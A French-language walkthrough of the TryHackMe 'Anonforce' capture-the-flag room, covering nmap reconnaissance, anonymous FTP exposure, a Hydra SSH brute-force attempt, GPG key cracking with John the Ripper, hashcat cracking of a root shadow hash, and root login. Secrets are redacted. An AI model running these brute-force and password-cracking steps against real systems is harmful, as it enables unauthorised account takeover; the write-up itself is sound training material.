---
title: Anonforce (Guatemala CTF)
tags: [TryHackMe, Facile, FTP, Force brute, John The Ripper, Hashcat]
style: border
color: thm
comments: false
description: Une configuration non sécurisée, et des mots de passe faibles
modified: 06/09/2024
---
Lien vers l'épreuve : <https://tryhackme.com/r/room/bsidesgtanonforce>

![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)

## Sommaire <!-- omit in toc -->

* [1. Reconnaissance](#1-reconnaissance)
* [2. Serveur {% include dictionary.html word="FTP" %}](#2-serveur--include-dictionaryhtml-wordftp-)
* [3. Accès au serveur](#3-accès-au-serveur)
  * [3.1 Récupération du fichier Shadow](#31-récupération-du-fichier-shadow)
  * [3.2 Force brute avec {% include dictionary.html word="Hydra" %}](#32-force-brute-avec--include-dictionaryhtml-wordhydra-)
  * [3.3 Contenu chiffré](#33-contenu-chiffré)
  * [3.4 Craquer le mot de passe](#34-craquer-le-mot-de-passe)
* [4. Connexion à la machine](#4-connexion-à-la-machine)

## 1. Reconnaissance

```bash
nmap -T4 -A 10.10.106.181
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-31 15:12 CEST
Nmap scan report for 10.10.106.181
Host is up (0.034s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Aug 31 06:08 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  102 0        0               0 Aug 31 06:08 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Aug 31 06:08 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Aug 31 06:08 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.1.218
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Le scan {% include dictionary.html word="NMAP" %} lancé sur la machine indique la présence d'un serveur {% include dictionary.html word="FTP" %} sur le port 21. Le service n'est pas protégé et n'importe quel utilisateur peut s'y connecter anonymement. Le scan révèle la présence d'une arborescence similaire à une machine Linux

## 2. Serveur {% include dictionary.html word="FTP" %}

Nous pouvons nous connecter au serveur et explorer son contenu.

```bash
ftp anonymous@10.10.106.181
Connected to 10.10.106.181.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd /home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||21366|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||5815|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> get user.txt
local: user.txt remote: user.txt
229 Entering Extended Passive Mode (|||19695|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |***************************************************|    33       36.74 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.98 KiB/s)
```

Nous y trouvons un dossier personnel de l'utilisateur Melodias et nous avons la possibilité de récupérer le fichier contenant le flag utilisateur.

Nous pouvons le lire sur notre machine :

```bash
cat user.txt
606083[...expurgé...]706af8
```

En revanche, le dossier `/root` n'est pas accessible de cette manière.

## 3. Accès au serveur

### 3.1 Récupération du fichier Shadow

La tentative de récupérer le fichier `/etc/shadow` contenant les hashes de mot de passe n'a pas fonctionné. Les utilisateurs anonymes n'y ont pas accès.

```bash
ftp> cd /etc
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||54445|)
150 Here comes the directory listing.
[...Expurgé pour brièveté...]
-rw-r-----    1 0        42           1014 Aug 11  2019 shadow
[...Expurgé pour brièveté...]
226 Directory send OK.
ftp> get shadow
local: shadow remote: shadow
229 Entering Extended Passive Mode (|||64609|)
550 Failed to open file.
```

### 3.2 Force brute avec {% include dictionary.html word="Hydra" %}

Nous tentons donc de trouver le mot de passe de l'utilisateur "melodias" par la force brute et l'outil {% include dictionary.html word="Hydra" %} sur le service {% include dictionary.html word="SSH" %} sans grand succès.

```bash
hydra -l 'melodias' -P /usr/share/wordlists/rockyou.txt 10.10.106.181 ssh -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-31 15:33:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.106.181:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://melodias@10.10.106.181:22
[INFO] Successful, password authentication is supported by ssh://10.10.106.181:22
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[...Expurgé pour brièveté...]
```

### 3.3 Contenu chiffré

En analysant davantage le serveur {% include dictionary.html word="FTP" %}, un dossier nous interpelle : **notread**. Il contient des données chiffrées, et une clé {% include dictionary.html word="GPG" %} privée.

```bash
ls
229 Entering Extended Passive Mode (|||36402|)
150 Here comes the directory listing.
[...Expurgé pour brièveté...]
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
[...Expurgé pour brièveté...]
226 Directory send OK.
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||35540|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> get backup.pgp
local: backup.pgp remote: backup.pgp
229 Entering Extended Passive Mode (|||18907|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |********************************************************************|   524        1.04 MiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (15.61 KiB/s)
ftp> get private.asc
local: private.asc remote: private.asc
229 Entering Extended Passive Mode (|||6406|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |********************************************************************|  3762        2.00 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (104.45 KiB/s)
```

En voulant ajouter la clé privée à notre trousseau, un mot de passe nous est demandé. Nous allons devoir recourir à nouveau à la force brute.

```bash
gpg --import-keys private.asc

│ Veuillez entrer la phrase secrète pour importer la clef secrète OpenPGP : │
│ « anonforce <melodias@anonforce.nsa> »                                    │
│ clef DSA de 2048 bits, identifiant B92CD1F280AD82C2,                      │
│ créée le 2019-08-12.                                                      |
```

Pour cela nous aurons besoin de l'outil *<abbr title="Logiciel de craquage de mot de passe">John The Ripper</abbr>* et `gpg2john` afin de convertir la clé privée en hash compréhensible par John.

```bash
gpg2john private.asc > key_hash.txt

john --format=gpg key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
x[...expurgé...]0          (anonforce)
1g 0:00:00:00 DONE (2024-08-31 18:08) 14.28g/s 13314p/s 13314c/s 13314C/s xbox360..madalina
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Nous pouvons ajouter la clé privée à notre trousseau avec le mot de passe que nous venons de craquer, et déchiffrer le contenu de l'archive chiffrée `backup.pgp`. Le contenu s'avère être un fichier texte renfermant entre autres les hashes de mot de passe des comptes root et melodias (une copie du fichier shadow que nous espérions récupérer depuis le serveur {% include dictionary.html word="FTP" %} plus tôt)

```bash
gpg --import private.asc
gpg -o backup -d backup.pgp
cat backup
root:$6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
[...expurgé pour brièveté...]
melodias:$1$xDhc6S6G$IQHU[...expurgé...]jEQtL1:18120:0:99999:7:::
```

### 3.4 Craquer le mot de passe

En lançant {% include dictionary.html word="Hashcat" %} sur les 2 hashes en parallèle, nous obtenons un résultat pour le compte root.

```bash
hashcat -m 1800 '$6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0' /usr/share/wordlists/rockyou.txt
[...expurgé pour brièveté...]

$6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0:h[...expurgé...]i

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$07nYFaYf$F4V[...expurgé...]BtaMZMNd2tV4uob5RVM0
Time.Started.....: Sat Aug 31 18:31:07 2024 (3 secs)
Time.Estimated...: Sat Aug 31 18:31:10 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     2442 H/s (4.14ms) @ Accel:512 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7168/14344384 (0.05%)
Rejected.........: 0/7168 (0.00%)
Restore.Point....: 6656/14344384 (0.05%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
Candidate.Engine.: Device Generator
Candidates.#1....: 111111111111111 -> droopy

Started: Sat Aug 31 18:30:22 2024
Stopped: Sat Aug 31 18:31:11 2024
```

## 4. Connexion à la machine

Nous pouvons donc nous connecter en {% include dictionary.html word="SSH" %} à la machine avec le compte root et le mot de passe que nous venons de craquer. Ne reste plus qu'à récupérer le flag root pour terminer cet exercice.

```bash
ssh root@10.10.106.181
cat root.txt
f70645[...expurgé...]cebdce
```
